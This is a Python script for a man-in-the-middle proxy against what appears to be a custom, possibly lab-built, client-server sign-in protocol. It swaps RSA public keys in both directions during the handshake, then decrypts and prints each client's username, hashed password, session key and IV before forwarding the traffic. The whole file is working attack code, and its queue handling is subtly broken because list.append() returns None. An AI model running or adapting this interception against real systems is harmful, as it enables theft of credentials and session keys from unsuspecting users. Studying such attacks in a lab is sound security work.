import socket
import common
from cryptography.hazmat.primitives import serialization
import select
import time
import json

def start():
    setup()
    run()

recv = common.recv
send = common.send

def setup():
    global listener
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind(("",  22221))
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.listen()
    setup_server()

def setup_server():
    global server
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect(("127.0.0.1", 22222))

def run():
    global input_sources
    input_sources = [listener, server]
    try:
        while True:
            socks = select.select(input_sources, [], [], 0.1)[0]

            for sock in socks:
                if sock == listener:
                    client_sock, addr = sock.accept()
                    # Called when we intercept a new client->server connection
                    print(f"new client->server connection from {addr}")
                    server_stage_1(client_sock)
                elif sock == server:
                    # Called on any connection from the server
                    determine_server_function()
                else:
                    # Called when we receive new data on a previously established socket
                    determine_client_function(sock)
    except KeyboardInterrupt:
        for sock in input_sources:
            sock.close()

        print("\nserver stopped")
        exit(0)

connections: dict = {}

client_awaiting_response: dict = {}  # {message_type: [socket, ...]}

# Poisons the first connection from the client to the server, replacing their public key with our own
def server_stage_1(sock: socket.socket):
    data = recv(sock)

    client_pub_key = serialization.load_pem_public_key(data["payload"]["public_key"].encode())

    connections[sock] = {
        "client_pub_key": client_pub_key
    }
    connections[sock]["my_client_priv_key"] = common.rsa4096_generate()

    data["payload"]["public_key"] = connections[sock]["my_client_priv_key"].public_key().public_bytes(
        encoding = serialization.Encoding.PEM,
        format = serialization.PublicFormat.SubjectPublicKeyInfo
    ).decode()

    send(server, data)

    input_sources.append(sock)

    client_awaiting_response["sign-in stage-2"] = client_awaiting_response.get("sign-in stage-2", []).append(sock) if "sign-in stage-2" in client_awaiting_response else [sock]

    print("Poisoned client->server public key")

def determine_server_function():
    try:
        data = recv(server)
    except (TypeError, json.decoder.JSONDecodeError):
        return
    if data["type"] == "sign-in":
        if data["payload"]["step"] == 2:
            server_stage_2(data)
        elif data["payload"]["step"] == 4:
            server_stage_4(data)
    elif data["type"] == "list":
        server_response_list(data)

# Poisons the second connection from the client to the server, replacing their public key with our own
# Also reencrypts the t1 and t2 elements of the payload using the client's public key
def server_stage_2(data: dict):
    server_pub_key: str = serialization.load_pem_public_key(data["payload"]["public_key"].encode())

    assert len(client_awaiting_response.get("sign-in stage-2", [])) > 0
    sock = client_awaiting_response["sign-in stage-2"].pop(0)

    connections[sock]["server_pub_key"] = server_pub_key
    connections[sock]["my_server_priv_key"] = common.rsa4096_generate()

    data["payload"]["public_key"] = connections[sock]["my_server_priv_key"].public_key().public_bytes(
        encoding = serialization.Encoding.PEM,
        format = serialization.PublicFormat.SubjectPublicKeyInfo
    ).decode()

    reencrypt_elements = ["t1", "t2"]

    for element in reencrypt_elements:
        decrypted_data = common.rsa4096_decrypt(connections[sock]["my_client_priv_key"], bytes.fromhex(data["payload"][element]))
        reencrypted_data = common.rsa4096_encrypt(connections[sock]["client_pub_key"], decrypted_data)
        data["payload"][element] = reencrypted_data.hex()

    send(sock, data)

    print("Poisoned server->client public key")

def determine_client_function(sock: socket.socket):
    data = recv(sock)
    if data["type"] == "sign-in":
        if data["payload"]["step"] == 3:
            server_stage_3(sock, data)
    elif data["type"] == "list":
        client_request_list(sock, data)

def server_stage_3(sock: socket.socket, data: dict):
    priv_key = connections[sock]["my_server_priv_key"]
    connections[sock]["username"] = common.rsa4096_decrypt(priv_key, bytes.fromhex(data["payload"]["username"])).decode()
    connections[sock]["hashed_password"] = common.rsa4096_decrypt(priv_key, bytes.fromhex(data["payload"]["hashed_password"])).decode()
    connections[sock]["session_key"] = common.rsa4096_decrypt(priv_key, bytes.fromhex(data["payload"]["session_key"]))
    # For whatever reason, the IV is static. Save it for future reuse.
    connections[sock]["iv"] = common.rsa4096_decrypt(priv_key, bytes.fromhex(data["payload"]["iv"]))
    
    reencrypt_elements = ["username", "hashed_password", "session_key", "iv", "t2", "t3"]

    pub_key = connections[sock]["server_pub_key"]
    for element in reencrypt_elements:
        decrypted_data = common.rsa4096_decrypt(priv_key, bytes.fromhex(data["payload"][element]))
        reencrypted_data = common.rsa4096_encrypt(pub_key, decrypted_data)
        data["payload"][element] = reencrypted_data.hex()

    send(server, data)

    # client_awaiting_response["sign-in stage-4"] = client_awaiting_response.get("sign-in stage-4", []).append(sock)
    client_awaiting_response["sign-in stage-4"] = client_awaiting_response.get("sign-in stage-4", []).append(sock) if "sign-in stage-4" in client_awaiting_response else [sock]

    print(f"Client username: {connections[sock]['username']}")
    print(f"Session Key: {connections[sock]['session_key']}")
    print(f"Static(?) IV: {connections[sock]['iv']}")

def server_stage_4(data: dict):
    assert len(client_awaiting_response.get("sign-in stage-4", [])) > 0
    sock = client_awaiting_response["sign-in stage-4"].pop(0)

    send(sock, data)

    print("Server-client handshake complete")

def client_request_list(sock: socket.socket, data: dict):
    send(server, data)

    client_awaiting_response["list"] = client_awaiting_response.get("list", []).append(sock) if "list" in client_awaiting_response else [sock]

    print(f"Client {connections[sock]['username']} requested list of clients")

def server_response_list(data: dict):
    assert len(client_awaiting_response["list"]) > 0
    sock = client_awaiting_response["list"].pop(0)

    send(sock, data)

    print("Server responded with list of clients")
    

start()